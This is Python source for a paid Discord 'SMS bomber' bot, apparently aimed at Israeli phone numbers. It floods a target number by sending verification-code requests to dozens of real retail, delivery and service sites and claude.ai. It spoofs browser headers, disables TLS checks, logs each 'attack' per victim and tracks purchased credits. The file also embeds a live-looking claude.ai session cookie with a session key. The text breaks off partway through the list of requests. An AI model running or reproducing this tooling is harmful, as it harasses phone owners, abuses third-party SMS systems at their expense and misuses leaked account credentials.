import discord
from discord import app_commands
from discord.ext import commands
import asyncio
import time
import random
import uuid
import aiohttp
from pymongo import MongoClient
from motor.motor_asyncio import AsyncIOMotorClient
import logging
import re
import sys
import os
from datetime import datetime, timezone
import certifi

TOKEN = os.getenv("DISCORD_TOKEN")
MONGO_URI = os.getenv("MONGO_URI")
DB_NAME = "my_app_db"

CHANNELS = {
    "PANEL": 1481957038241353779,
    "GIFT_PANEL": 1485104425625325709,
}

FREE_CREDITS_CHANNEL = 1485104425625325709
BOMB_AUTO_CHANNEL = 1481957038241353779
INFO_CHANNEL = 1485125569690603692
ADMIN_ROLE = 1480762750052601886
PURCHASE_URL = "https://discord.gg/3CxwPGuGyq"

COOLDOWN_TIME = 20
CREDITS_PER_ROUND = 3
MAX_CREDIT_USAGE = 100
LAUNCH_DELAY = 5

COLOR_RED = 0xDC143C
COLOR_DARK_RED = 0x8B0000
COLOR_ORANGE = 0xFF4500
COLOR_BLACK = 0x2b2d31

CLAUDE_SESSION = "activitySessionId=8e5e644c-d640-4b9f-be61-59b9a138a42b; anthropic-device-id=4ed16e2b-8252-4456-8e7a-e466ede65652; _fbp=fb.1.1773186995656.51415631283246056; app-shell-mode=gate-disabled; CH-prefers-color-scheme=light; __ssid=aac9d1c5-0950-4438-b7ea-a89a1639d015; cookie_seed_done=1; intercom-device-id-lupk8zyo=f68271ce-ab05-40b7-b143-901ad283a161; user-sidebar-visible-on-load=true; user-recents-collapsed=false; user-sidebar-pinned=true; g_state={\"i_l\":0,\"i_ll\":1773414635601,\"i_b\":\"y3RrxvHpC/63IgqxQoW+FkAztdzRlQfKqrSCo5paIW4\",\"i_e\":{\"enable_itp_optimization\":0},\"i_t\":1773501035602}; __cf_bm=3VjDxw6wkQm2wlbHFDvk8MaDT_DB6R36F4R.MVnz0p4-1773447632-1.0.1.1-6q05RiFdtxB27W.Dlk8sZzMKN2_GWuJqrNh03eIFieCaneWW7KiQJxVTVTNIxcxA4EeiLytjTSnQLzFe5XvedaBVzIzDp_EoeqS.drKNHic; _cfuvid=zbw_U3cChwMfKZyPfROexrLBbuzQTKW2FW6ko.UebTU-1773447632362-0.0.1.1-604800000; __stripe_mid=eabdbe50-cd60-4100-9f89-6403dde971eb6b036c; __stripe_sid=7b2497e5-5647-4528-aa38-9272e68de8c5289f41; sessionKey=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; lastActiveOrg=2b096853-0284-4d04-8bee-d3d6eb9ec7b1; cf_clearance=CM9MGR4oytc4fDuAdMWrgtGLrwjHrZfyGjDHQmELKWs-1773447692-1.2.1.1-8qu2TBglm35vOa3Y5dwU3Ue0D7gBkTfD20EtG9u.GXPEkWyTnnSOlsalbwktHG1lj9TvVOnuD19OeZaXbAIFnPMBAT3VnNkt2Rg5J8MQ9qAXN3Wf3DwDbPI.qiNUmVZwwvjmHdyRkI.fuz248__ESMWvCdMkeASIwHP7DT5e14INWZ3.iSxdKpFmZwoKzVGj1ge2Bba07dhQbqnbXVM1J7Ov4yMposOalAOKdx7hZN4; ajs_user_id=34d05785-fcf5-4298-8314-ac95766337ff; ajs_anonymous_id=64ed414c-6982-4d71-803f-2241e4e9546a; intercom-session-lupk8zyo=QTJuM3pjOVY3bWs1Njc4T0ZBQlZ1T2V6OUx0bjREempveE5JalZsR0FNMEpZYjdXZ3BYUE83WnhxYXV4S0tZSTdORlluTUc2OE14UnVCRHhBcjlzdE42SFo1ZW1NK1hWeEtZeTA0Y0hYYzlvcTN0RlBCa2YxV3JRbGJHM1B4WFltZVNNWk1QUXhWMzBEclNvUFphUTZNNTV0dk12T2s5QzhYSGN2U0pkeWNHM2NSOEZyMUU3amxwU2N5MGc4VkRpVEFZS0JrQzF3MFUyc2pzZlJyV0lTdXlDNncvYUYzcjQ1UkRkbzdmRTA1MnhiSHliZSt0akc2NjBzdjUyV2VwVkNQZ3ptd09xRzZZOTJMMXZEUzFVNmxxb3RTNG1ZYWs1K3Y5RFBTQXhiM1k9LS1YdEp3STBsUkF2S2FWSFptb29sYzFnPT0=--94e9f81d682285fead0655379f59452a0e43ab83; routingHint=sk-ant-rh-eyJ0eXAiOiAiSldUIiwgImFsZyI6ICJFUzI1NiIsICJraWQiOiAiN0MxcWFPRnhqdWxaUjRFQnNuNk1UeUZGNWdDV2JHbFpNVDR2RklrRFFpbyJ9.eyJzdWIiOiAiMzRkMDU3ODUtZmNmNS00Mjk4LTgzMTQtYWM5NTc2NjMzN2ZmIiwgImlhdCI6IDE3NzM0NDc2OTYsICJpc3MiOiAiY2xhdWRlLWFpLXJvdXRpbmciLCAib25ib2FyZGluZ19jb21wbGV0ZSI6IHRydWUsICJwaG9uZV92ZXJpZmllZCI6IGZhbHNlLCAiYWdlX3ZlcmlmaWVkIjogdHJ1ZSwgImxvY2FsZSI6ICJlbi1VUyJ9.yRj_WgY7-XZbfW8XvjAb8ybkDmv2wDhrNH2WqAywFX2DVfMGZayA92Tj5WJwB3-kcV2JC3Un2eERG-bLEPQlAw; _gcl_au=1.1.357471279.1773367551.67089487.1773447650.1773447710; _dd_s=aid=631a5dba-fcfc-4e29-854f-58b2ec36a49d&rum=0&expire=1773448656835"

intents = discord.Intents.default()
intents.message_content = True
intents.members = True
intents.guilds = True

bot = commands.Bot(command_prefix="!", intents=intents)
tree = bot.tree

mongo_client = AsyncIOMotorClient(MONGO_URI, tlsCAFile=certifi.where())
db = mongo_client[DB_NAME]
users_db = db["users"]
cooldown_db = db["cooldowns"]
settings_db = db["settings"]
logs_db = db["attack_logs"]

logging.basicConfig(level=logging.WARNING)

active_attacks = {}
cooldown_tracker = {}

USER_AGENTS_LIST = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/128.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/127.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/145.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.4.1 Safari/605.1.15"
]

def random_user_agent():
    return random.choice(USER_AGENTS_LIST)

async def get_user_credits(user_id: int) -> int:
    data = await users_db.find_one({"_id": user_id})
    if not data:
        return 0
    if data.get("lifetime"):
        return 999999
    return data.get("credits", 0)

async def has_lifetime_access(user_id: int) -> bool:
    data = await users_db.find_one({"_id": user_id})
    return bool(data and data.get("lifetime"))

async def display_balance(user_id: int) -> str:
    if await has_lifetime_access(user_id):
        return "ללא הגבלה"
    return str(await get_user_credits(user_id))

async def add_credits_to_user(user_id: int, amount: int):
    await users_db.update_one({"_id": user_id}, {"$inc": {"credits": amount}}, upsert=True)

async def remove_credits_from_user(user_id: int, amount: int):
    await users_db.update_one({"_id": user_id}, {"$inc": {"credits": -amount}}, upsert=True)

async def set_lifetime_status(user_id: int, status: bool):
    await users_db.update_one({"_id": user_id}, {"$set": {"lifetime": status}}, upsert=True)

async def deduct_single_credit(user_id: int) -> bool:
    if await has_lifetime_access(user_id):
        return True
    result = await users_db.update_one(
        {"_id": user_id, "credits": {"$gte": 1}},
        {"$inc": {"credits": -1}}
    )
    return result.modified_count == 1

async def check_target_cooldown(target: str):
    record = await cooldown_db.find_one({"phone": target})
    if not record:
        return False, 0
    time_passed = time.time() - record["last_sent"]
    if time_passed < COOLDOWN_TIME:
        return True, int(COOLDOWN_TIME - time_passed)
    return False, 0

async def apply_target_cooldown(target: str):
    await cooldown_db.update_one({"phone": target}, {"$set": {"last_sent": time.time()}}, upsert=True)

def is_admin_user(interaction: discord.Interaction) -> bool:
    return ADMIN_ROLE in [role.id for role in interaction.user.roles]

async def save_attack_log(user_id: int, username: str, phone: str, credits: int, successes: int, fails: int, duration: int):
    log_entry = {
        "user_id": user_id,
        "user_name": username,
        "phone": phone,
        "credits_used": credits,
        "success_count": successes,
        "failed_count": fails,
        "total_requests": successes + fails,
        "duration": duration,
        "timestamp": datetime.now(timezone.utc),
        "date": datetime.now(timezone.utc).strftime("%Y-%m-%d"),
        "time": datetime.now(timezone.utc).strftime("%H:%M:%S")
    }
    await logs_db.insert_one(log_entry)

async def get_user_attack_history(user_id: int, limit: int = 20):
    cursor = logs_db.find({"user_id": user_id}).sort("timestamp", -1).limit(limit)
    return await cursor.to_list(length=limit)

async def get_all_attack_history(limit: int = 100):
    cursor = logs_db.find().sort("timestamp", -1).limit(limit)
    return await cursor.to_list(length=limit)

async def get_user_statistics(user_id: int):
    pipeline = [
        {"$match": {"user_id": user_id}},
        {"$group": {
            "_id": "$user_id",
            "total_attacks": {"$sum": 1},
            "total_credits": {"$sum": "$credits_used"},
            "total_success": {"$sum": "$success_count"},
            "total_failed": {"$sum": "$failed_count"},
            "total_requests": {"$sum": "$total_requests"},
            "last_attack": {"$max": "$timestamp"}
        }}
    ]
    result = await logs_db.aggregate(pipeline).to_list(1)
    return result[0] if result else None

async def get_global_statistics():
    pipeline = [
        {"$group": {
            "_id": None,
            "total_attacks": {"$sum": 1},
            "total_credits": {"$sum": "$credits_used"},
            "total_success": {"$sum": "$success_count"},
            "total_failed": {"$sum": "$failed_count"},
            "total_requests": {"$sum": "$total_requests"},
            "unique_users": {"$addToSet": "$user_id"}
        }}
    ]
    result = await logs_db.aggregate(pipeline).to_list(1)
    if result:
        result[0]["unique_users"] = len(result[0]["unique_users"])
        return result[0]
    return None

async def get_most_attacked_numbers(limit: int = 10):
    pipeline = [
        {"$group": {
            "_id": "$phone",
            "count": {"$sum": 1},
            "success_total": {"$sum": "$success_count"}
        }},
        {"$sort": {"count": -1}},
        {"$limit": limit}
    ]
    return await logs_db.aggregate(pipeline).to_list(length=limit)

async def send_http_request(session, method, url, form_data=None, json_data=None, custom_headers=None, tag=""):
    headers = {
        "User-Agent": random_user_agent(),
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
    }
    if custom_headers:
        headers.update(custom_headers)
    if isinstance(form_data, str):
        headers.setdefault("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
    try:
        timeout = aiohttp.ClientTimeout(total=12)
        if method.upper() == "POST":
            if json_data is not None:
                headers.setdefault("Content-Type", "application/json")
                async with session.post(url, json=json_data, headers=headers, timeout=timeout, ssl=False) as resp:
                    await resp.read()
                    success = 200 <= resp.status < 300
                    return success, tag, "OK" if success else f"HTTP {resp.status}"
            else:
                async with session.post(url, data=form_data, headers=headers, timeout=timeout, ssl=False) as resp:
                    await resp.read()
                    success = 200 <= resp.status < 300
                    return success, tag, "OK" if success else f"HTTP {resp.status}"
        else:
            async with session.get(url, headers=headers, timeout=timeout, ssl=False) as resp:
                await resp.read()
                success = 200 <= resp.status < 300
                return success, tag, "OK" if success else f"HTTP {resp.status}"
    except Exception as error:
        return False, tag, str(type(error).__name__)

async def atmos_api_call(session, restaurant_id, phone, origin_url="https://order.atmos.rest", referer_url="https://order.atmos.rest/"):
    tag = f"atmos-{restaurant_id}"
    form = aiohttp.FormData()
    form.add_field("restaurant_id", restaurant_id)
    form.add_field("phone", phone)
    form.add_field("testing", "false")
    req_headers = {
        "User-Agent": random_user_agent(),
        "accept": "application/json, text/plain, */*",
        "accept-language": "he-IL,he;q=0.9",
        "accept-encoding": "gzip, deflate, br",
        "origin": origin_url,
        "referer": referer_url,
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "cross-site",
    }
    try:
        timeout = aiohttp.ClientTimeout(total=15)
        api_url = f"https://api-ns.atmos.co.il/rest/{restaurant_id}/auth/sendValidationCode"
        async with session.post(api_url, data=form, headers=req_headers, timeout=timeout, ssl=False) as resp:
            await resp.read()
            success = 200 <= resp.status < 300
            return success, tag, "OK" if success else f"HTTP {resp.status}"
    except Exception as error:
        return False, tag, str(type(error).__name__)

async def process_atmos_batch(session, target, store_ids):
    results = []
    batch_limit = 5
    for i in range(0, len(store_ids), batch_limit):
        batch = store_ids[i:i + batch_limit]
        tasks = [atmos_api_call(session, sid, target) for sid in batch]
        batch_results = await asyncio.gather(*tasks, return_exceptions=True)
        results.extend(batch_results)
        await asyncio.sleep(0.5)
    return results

async def claude_api_call(session, phone):
    tag = "claude"
    clean_number = phone.lstrip('0')
    if not clean_number.startswith('+972'):
        clean_number = f"+972{clean_number}"
    api_url = "https://claude.ai/api/auth/send_phone_code"
    req_headers = {
        "accept": "*/*",
        "accept-language": "he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7",
        "content-type": "application/json",
        "origin": "https://claude.ai",
        "referer": "https://claude.ai/onboarding",
        "sec-ch-ua": '"Chromium";v="146", "Not-A.Brand";v="24", "Google Chrome";v="146"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "anthropic-client-platform": "web_claude_ai",
        "anthropic-client-version": "1.0.0",
        "user-agent": random_user_agent()
    }
    if CLAUDE_SESSION:
        req_headers["cookie"] = CLAUDE_SESSION
    payload = {"phone_number": clean_number}
    try:
        timeout = aiohttp.ClientTimeout(total=12)
        async with session.post(api_url, json=payload, headers=req_headers, timeout=timeout, ssl=False) as resp:
            await resp.read()
            success = 200 <= resp.status < 300
            return success, tag, "OK" if success else f"HTTP {resp.status}"
    except Exception as error:
        return False, tag, str(type(error).__name__)

async def oshioshi_api_call(session, phone):
    tag = "oshioshi"
    try:
        timeout = aiohttp.ClientTimeout(total=15)
        async with session.get("https://delivery.oshioshi.co.il/he/login", timeout=timeout, ssl=False) as resp:
            page_text = await resp.text()
            token_match = re.search(r'name="_token"\s+value="([^"]+)"', page_text)
            if not token_match:
                return False, tag, "Missing Token"
            csrf_token = token_match.group(1)
        api_url = "https://delivery.oshioshi.co.il/he/auth/register-send-code"
        form_data = f"phone={phone}&_token={csrf_token}"
        req_headers = {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": "https://delivery.oshioshi.co.il",
            "referer": "https://delivery.oshioshi.co.il/he/",
            "User-Agent": random_user_agent()
        }
        async with session.post(api_url, data=form_data, headers=req_headers, timeout=timeout, ssl=False) as resp:
            await resp.read()
            success = 200 <= resp.status < 300
            return success, tag, "OK" if success else f"HTTP {resp.status}"
    except Exception as error:
        return False, tag, str(type(error).__name__)

async def freetv_api_call(session, phone):
    tag = "freetv"
    formatted_phone = f"+972{phone[1:]}" if phone.startswith("0") else f"+972{phone}"
    api_url = "https://middleware.freetv.tv/api/v1/send-verification-sms"
    payload = {"msisdn": formatted_phone}
    req_headers = {
        "Content-Type": "application/json",
        "Accept": "application/json",
        "User-Agent": random_user_agent(),
        "Origin": "https://freetv.tv",
        "Referer": "https://freetv.tv/"
    }
    try:
        timeout = aiohttp.ClientTimeout(total=12)
        async with session.post(api_url, json=payload, headers=req_headers, timeout=timeout, ssl=False) as resp:
            await resp.read()
            success = 200 <= resp.status < 300
            return success, tag, "OK" if success else f"HTTP {resp.status}"
    except Exception as error:
        return False, tag, str(type(error).__name__)

async def webcut_whatsapp_call(session, phone):
    tag = "webcut-whatsapp"
    api_url = "https://us-central1-webcut-2001a.cloudfunctions.net/sendWhatsApp"
    payload = {"type": "otp", "data": {"phone": phone}}
    req_headers = {
        "Content-Type": "application/json",
        "User-Agent": random_user_agent()
    }
    try:
        timeout = aiohttp.ClientTimeout(total=12)
        async with session.post(api_url, json=payload, headers=req_headers, timeout=timeout, ssl=False) as resp:
            await resp.read()
            success = 200 <= resp.status < 300
            return success, tag, "OK" if success else f"HTTP {resp.status}"
    except Exception as error:
        return False, tag, str(type(error).__name__)

async def freeivr_call(session, phone):
    tag = "freeivr"
    formatted_phone = f"972{phone[1:]}" if phone.startswith("0") else f"972{phone}"
    api_url = "https://f2.freeivr.co.il/api/v3/plugins/MitMValidPhone"
    payload = {"phone": formatted_phone}
    req_headers = {
        "Content-Type": "application/json",
        "User-Agent": random_user_agent(),
        "Origin": "https://freeivr.co.il",
        "Referer": "https://freeivr.co.il/"
    }
    try:
        timeout = aiohttp.ClientTimeout(total=12)
        async with session.post(api_url, json=payload, headers=req_headers, timeout=timeout, ssl=False) as resp:
            await resp.read()
            success = 200 <= resp.status < 300
            return success, tag, "OK" if success else f"HTTP {resp.status}"
    except Exception as error:
        return False, tag, str(type(error).__name__)

async def execute_all_attacks(target_number):
    raw_number = target_number
    formatted_number = f"+972{raw_number[1:]}" if raw_number.startswith("0") else f"+972{raw_number}"
    session_id = str(uuid.uuid4())
    random_email = f"user{''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=6))}@gmail.com"
    FORM_TYPE = "application/x-www-form-urlencoded; charset=UTF-8"
    BROWSER_ID = '"Google Chrome";v="145", "Chromium";v="145", "Not/A)Brand";v="24"'

    def build_form_headers(origin, referer, extra=None):
        headers = {"Content-Type": FORM_TYPE, "x-requested-with": "XMLHttpRequest",
                   "origin": origin, "referer": referer,
                   "sec-ch-ua": BROWSER_ID, "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"Windows"',
                   "sec-fetch-dest": "empty", "sec-fetch-mode": "cors", "sec-fetch-site": "same-origin"}
        if extra:
            headers.update(extra)
        return headers

    def build_json_headers(origin, referer, extra=None):
        headers = {"Content-Type": "application/json",
                   "origin": origin, "referer": referer,
                   "sec-ch-ua": BROWSER_ID, "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"Windows"',
                   "sec-fetch-dest": "empty", "sec-fetch-mode": "cors"}
        if extra:
            headers.update(extra)
        return headers

    connector = aiohttp.TCPConnector(limit=120, ttl_dns_cache=300)
    async with aiohttp.ClientSession(connector=connector) as session:
        atmos_stores = [
            "1","2","3","4","5","7","8","13","15","18","21","23","24","27",
            "28","29","33","35","48","51","56","57","59",
            "2008","2011","2012","2014","2041","2052","2053","2056","2059",
            "2063","2070","2073","2076","2078","2087","2088","2091",
        ]
        atmos_results = await process_atmos_batch(session, raw_number, atmos_stores)
        
        atmos_club_tasks = [
            atmos_api_call(session, "23", raw_number, origin="https://club-register.atmos.co.il", referer="https://club-register.atmos.co.il/"),
            atmos_api_call(session, "59", raw_number, origin="https://club-register.atmos.co.il", referer="https://club-register.atmos.co.il/"),
        ]

        attack_tasks = [
            send_http_request(session, "POST", "https://netfree.link/api/user/verify-phone/get-call",
                json_data={"agreeTou": True, "phone": formatted_number},
                custom_headers=build_json_headers("https://netfree.link", "https://netfree.link/welcome/", {"sec-fetch-site": "same-origin"}),
                tag="netfree"),
            claude_api_call(session, raw_number),
            oshioshi_api_call(session, raw_number),
            freetv_api_call(session, raw_number),
            webcut_whatsapp_call(session, raw_number),
            freeivr_call(session, raw_number),
            send_http_request(session, "POST", "https://www.negev-group.co.il/customer/ajax/post/",
                form_data=f"form_key=a93dnWr8cjYH8wZ2&bot_validation=1&type=login&telephone={raw_number}&code=&compare_email=&compare_identity=",
                custom_headers=build_form_headers("https://www.negev-group.co.il", "https://www.negev-group.co.il/", {"sec-fetch-site": "same-origin"}),
                tag="negev-group"),
            send_http_request(session, "POST", "https://www.gali.co.il/customer/ajax/post/",
                form_data=f"form_key=xT4xBP6oaqFhxMVR&bot_validation=1&type=login&telephone={raw_number}&code=&compare_email=&compare_identity=",
                custom_headers=build_form_headers("https://www.gali.co.il", "https://www.gali.co.il/"),
                tag="gali"),
            send_http_request(session, "POST", "https://www.aldoshoes.co.il/customer/ajax/post/",
                form_data=f"form_key=FD1Zm1GUMQXUivz6&bot_validation=1&type=login&telephone={raw_number}&code=&compare_email=&compare_identity=",
                custom_headers=build_form_headers("https://www.aldoshoes.co.il", "https://www.aldoshoes.co.il/"),
                tag="aldoshoes"),
            send_http_request(session, "POST", "https://www.hoodies.co.il/customer/ajax/post/",
                form_data=f"form_key=OCYFcuUfiQLCbya5&bot_validation=1&type=login&telephone={raw_number}&code=&compare_email=&compare_identity=",
                custom_headers=build_form_headers("https://www.hoodies.co.il", "https://www.hoodies.co.il/"),
                tag="hoodies"),
            send_http_request(session, "POST", "https://api.gomobile.co.il/api/login",
                form_data=f'{{"phone":"{raw_number}"}}',
                custom_headers=build_form_headers("https://www.gomobile.co.il", "https://www.gomobile.co.il/"),
                tag="gomobile"),
            send_http_request(session, "POST", "https://bonitademas.co.il/apps/imapi-customer",
                form_data=f'{{"action":"login","otpBy":"sms","otpValue":"{raw_number}"}}',
                custom_headers=build_form_headers("https://bonitademas.co.il", "https://bonitademas.co.il/"),
                tag="bonitademas"),
            send_http_request(session, "POST", "https://story.magicetl.com/public/shopify/apps/otp-login/step-one",
                form_data=f'{{"phone":"{raw_number}"}}',
                custom_headers=build_form_headers("https://storyonline.co.il", "https://storyonline.co.il/"),
                tag="storyonline"),
            send_http_request(session, "POST", "https://www.crazyline.com/customer/ajax/post/",
                form_data=f"form_key=qjDmQDc2pwYJIEin&bot_validation=1&type=login&telephone={raw_number}&code=&compare_email=&compare_identity=",
                custom_headers=build_form_headers("https://www.crazyline.com", "https://www.crazyline.com/"),
                tag="crazyline"),
            send_http_request(session, "POST", "https://authentication.wolt.com/v1/captcha/site_key_authenticated",
                json_data={"phone_number": f"{raw_number}", "operation": "request_number_verification"},
                custom_headers=build_form_headers("https://wolt.com", "https://wolt.com/"),
                tag="wolt-captcha"),
            send_http_request(session, "POST", "https://webapi.mishloha.co.il/api/profile/sendSmsVerificationCodeByPhoneNumber?uuid=4c48ed0d-9622-4a1e-ac70-2821631b680b&apiKey=BA6A19D2-F5BD-4B75-A080-6BD1E2FBEF54&sessionID=24014c96-61ca-4cd6-87a9-9324aa2f3150&culture=he_IL&apiVersion=2",
                form_data=f'{{"phoneNumber": "{raw_number}", "isCalling": true}}',
                custom_headers=build_form_headers("https://www.mishloha.co.il", "https://www.mishloha.co.il/"),
                tag="mishloha"),
            send_http_request(session, "POST", "https://www.golfkids.co.il/customer/ajax/post/",
                form_data=f"form_key=XB0c9tAkTouRgHrI&bot_validation=1&type=login&telephone={raw_number}&code=&compare_email=&compare_identity=",
                custom_headers=build_form_headers("https://www.golfkids.co.il", "https://www.golfkids.co.il/"),
                tag="golfkids"),
            send_http_request(session, "POST", "https://www.onot.co.il/customer/ajax/post/",
                form_data=f"form_key=xmemtkBNMoUSLrMN&bot_validation=1&type=login&telephone={raw_number}&code=&compare_email=&compare_identity=",
                custom_headers=build_form_headers("https://www.onot.co.il", "https://www.onot.co.il/"),
                tag="onot"),
            send_http_request(session, "POST", "https://fox.co.il/apps/dream-card/api/proxy/otp/send",
                form_data=f'{{"phoneNumber":"{raw_number}","uuid":"498d9bb2-0fa8-4d9c-9e71-f44fcbcd2195"}}',
                custom_headers=build_form_headers("https://fox.co.il", "https://fox.co.il/"),
                tag="fox"),
            send_http_request(session, "POST", "https://www.foxhome.co.il/apps/dream-card/api/proxy/otp/send",
                form_data=f'{{"phoneNumber":"{raw_number}","uuid":"6db5a63b-6882-414f-a090-de263dd917d7"}}',
                custom_headers=build_form_headers("https://www.foxhome.co.il", "https://www.foxhome.co.il/"),
                tag="foxhome"),
            send_http_request(session, "POST", "https://www.laline.co.il/apps/dream-card/api/proxy/otp/send",
                form_data=f'{{"phoneNumber":"{raw_number}","uuid":"ab29f239-0637-4c8e-8af5-fdfbaeb4b493"}}',
                custom_headers=build_form_headers("https://www.laline.co.il", "https://www.laline.co.il/"),
                tag="laline"),
            send_http_request(session, "POST", "https://footlocker.co.il/apps/dream-card/api/proxy/otp/send",
                form_data=f'{{"phoneNumber":"{raw_number}","uuid":"9961459f-9f83-4aab-9cee-58b1f6793547"}}',
                custom_headers=build_form_headers("https://footlocker.co.il", "https://footlocker.co.il/"),
                tag="footlocker"),
            send_http_request(session, "POST", "https://www.golfco.co.il/customer/ajax/post/",
                form_data=f"form_key=SIiL0WFN6AtJF6lb&bot_validation=1&type=login&telephone={raw_number}&code=&compare_email=&compare_identity=",
                custom_headers=build_form_headers("https://www.golfco.co.il", "https://www.golfco.co.il/"),
                tag="golfco"),
            send_http_request(session, "POST", "https://www.timberland.co.il/customer/ajax/post/",
                form_data=f"form_key=gU7iqYv5eiwuKVef&bot_validation=1&type=login&phone={raw_number}",
                custom_headers=build_form_headers("https://www.timberland.co.il", "https://www.timberland.co.il/"),
                tag="timberland"),
            send_http_request(session, "POST", "https://www.solopizza.org.il/_a/aff_otp_auth",
                form_data=f"value={raw_number}&type=phone&projectId=1",
                custom_headers=build_form_headers("https://www.solopizza.org.il", "https://www.solopizza.org.il/"),
                tag="solopizza"),
            send_http_request(session, "POST", "https://users-auth.hamal.co.il/auth/send-auth-code",
                form_data=f'{{"value":"{raw_number}","type":"phone","projectId":"1"}}',
                custom_headers=build_form_headers("https://hamal.co.il", "https://hamal.co.il/"),
                tag="hamal"),
            send_http_request(session, "POST", "https://www.urbanica-wh.com/customer/ajax/post/",
                form_data=f"form_key=sucdtpszDEqdOgkv&bot_validation=1&type=login&telephone={raw_number}&code=&compare_email=&compare_identity=",
                custom_headers=build_form_headers("https://www.urbanica-wh.com", "https://www.urbanica-wh.com/"),
                tag="urbanica"),
            send_http_request(session, "POST", "https://www.intima-il.co.il/customer/ajax/post/",
                form_data=f"form_key=ppjX1yBLuS9rB7zZ&bot_validation=1&type=login&country_code=972&telephone={raw_number}&code=&compare_email=&compare_identity=",
                custom_headers=build_form_headers("https://www.intima-il.co.il", "https://www.intima-il.co.il/"),
                tag="intima"),
            send_http_request(session, "POST", "https://www.steimatzky.co.il/customer/ajax/post/",
                form_data=f"form_key=4RmX16417urLzC5J&bot_validation=1&type=login&country_code=972&telephone={raw_number}&code=&compare_email=&compare_identity=",
                custom_headers=build_form_headers("https://www.steimatzky.co.il", "https://www.steimatzky.co.il/"),
                tag="steimatzky"),
            send_http_request(session, "POST", "https://www.globes.co.il/news/login-2022/ajax_handler.ashx?get-value-type",
                form_data=f"value={raw_number}&value_type=",
                custom_headers=build_form_headers("https://www.globes.co.il", "https://www.globes.co.il/"),
                tag="globes"),
            send_http_request(session, "POST", "https://www.moraz.co.il/wp-admin/admin-ajax.php",
                form_data=f"action=validate_user_by_sms&phone={raw_number}&email=&from_reg=false",
                custom_headers=build_form_headers("https://www.moraz.co.il", "https://www.moraz.co.il/", {"sec-fetch-site": "same-origin"}),
                tag="moraz"),
            send_http_request(session, "POST", "https://itaybrands.co.il/apps/dream-card/api/proxy/otp/send",
                json_data={"phoneNumber": raw_number, "uuid": session_id},
                custom_headers=build_json_headers("https://itaybrands.co.il", "https://itaybrands.co.il/", {"sec-fetch-site": "same-origin", "x-requested-with": "XMLHttpRequest"}),
                tag="itaybrands"),
            send_http_request(session, "POST", "https://api.gomobile.co.il/api/login",
                json_data={"phone": raw_number},
                custom_headers=build_json_headers("https://www.gomobile.co.il", "https://www.gomobile.co.il/", {"sec-fetch-site": "same-site"}),
                tag="gomobile"),
            send_http_request(session, "POST", "https://www.spicesonline.co.il/wp-admin/admin-ajax.php",
                form_data=f"action=validate_user_by_sms&phone={raw_number}",
                custom_headers=build_form_headers("https://www.spicesonline.co.il", "https://www.spicesonline.co.il/"),
                tag="spicesonline"),
            send_http_request(session, "POST", "https://www.stepin.co.il/customer/ajax/post/",
                form_data=f"form_key=BxItwcIQhlhsnaoi&bot_validation=1&type=login&telephone={raw_number}&code=&compare_email=&compare_identity=",
                custom_headers=build_form_headers("https://www.stepin.co.il", "https://www.stepin.co.il/"),
                tag="stepin"),
            send_http_request(session, "POST", "https://mobile.rami-levy.co.il/api/Helpers/OTP",
                form_data=f"phone={raw_number}&template=OTP&type=1",
                custom_headers={"Content-Type": "application/x-www-form-urlencoded", "accept-encoding": "gzip, deflate", "origin": "https://mobile.rami-levy.co.il", "referer": "https://mobile.rami-levy.co.il/", "x-requested-with": "XMLHttpRequest", "User-Agent": random_user_agent()},
                tag="rami-levy"),
            send_http_request(session, "POST", "https://api.zygo.co.il/v2/auth/create-verify-token",
                json_data={"phone": raw_number},
                custom_headers={"Content-Type": "application/json", "origin": "https://zygo.co.il", "referer": "https://zygo.co.il/", "accept-encoding": "gzip, deflate", "sec-fetch-site": "same-site"},
                tag="zygo"),
            send_http_request(session, "POST", "https://ros-rp.tabit.cloud/services/loyalty/customerProfile/auth/mobile",
                json_data={"mobile": raw_number},
                custom_headers={"Content-Type": "application/json", "accept-encoding": "gzip, deflate", "accountguid": "0787F516-E97E-408A-A1CF-53D0C4D57C7C", "cpversion": "3.3.0", "env": "il", "joinchannelguid": "74FE1A48-0FA0-4C8F-B962-6AE88A242023", "siteid": "6203e7787694b434c7a7eb0a", "origin": "https://customer-profile.tabit.cloud", "referer": "https://customer-profile.tabit.cloud/", "sec-fetch-site": "same-site"},
                tag="tabit"),
            send_http_request(session, "GET", f"https://ivr.business/api/Customer/getTempCodeToPhoneVarification/{raw_number}",
                custom_headers={"origin": "https://ivr.business", "referer": "https://ivr.business/", "accept-encoding": "gzip, deflate"},
                tag="ivr.business"),
            send_http_request(session, "POST", "https://www.call2all.co.il/ym/api/SelfCreateNewCustomer",
